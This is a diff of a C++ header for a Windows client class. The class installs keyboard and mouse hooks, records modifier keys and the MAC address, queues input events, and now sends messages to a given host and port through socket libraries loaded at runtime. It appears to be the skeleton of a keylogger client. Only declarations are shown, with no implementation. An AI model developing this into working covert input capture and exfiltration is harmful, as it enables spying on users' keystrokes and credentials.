@@ -7,6 +7,10 @@
 #include "Event.h"
 #include "KeyboardEvent.h"
 #include "MouseEvent.h"
+#include "DynamicLinkLibrary.hpp"
+#include "../../include/lib/ITime.hpp"
+#include "../../include/lib/ISocket.hpp"
+#include "../../include/lib/IProtocol.hpp"
 #pragma comment(lib, "IPHLPAPI.lib")
 
 class Client
@@ -19,7 +23,7 @@ public:
 	void					unsetHook(HHOOK hook);
 	void					unsetKeyboardHook(void);
 	void					unsetMouseHook(void);
-	void					sendBackMessage(void);
+	void					sendBackMessage(std::string const &host, std::string const &port);
 	void					getMACAddress(void);
 	void					setShift(bool shift);
 	void					setCtrl(bool ctrl);
@@ -32,19 +36,28 @@ public:
 	bool					getCapsLock(void);
 	bool					getAltGr(void);
 	int						getMod(void);
-	void					addEvent(Event &e);
+	void					addEvent(Event *e);
 private:
 	bool					isValidMac(PIP_ADAPTER_INFO adapterInfo);
 	std::string				addrToString(unsigned char mac[]);
 	HHOOK					m_keyboardHook;
 	HHOOK					m_mouseHook;
-	std::list<Event>		m_events;
+	std::list<Event *>		m_events;
 	bool					m_Shift;
 	bool					m_Ctrl;
 	bool					m_Alt;
 	bool					m_CapsLock;
 	bool					m_AltGr;
 	std::string				m_MAC;
+	DynamicLinkLibrary		m_time;
+	DynamicLinkLibrary		m_socket;
+	DynamicLinkLibrary		m_protocol;
+	fct_new_itime			m_new_itime;
+	fct_iselect				m_iselect;
+	fct_new_iclient			m_new_iclient;
+	fct_new_iprotocol		m_new_iprotocol;
+public:
+	ITime					&m_itime;
 };
 
 void						setModifier(int nCode, WPARAM wPAram, LPARAM lParam);
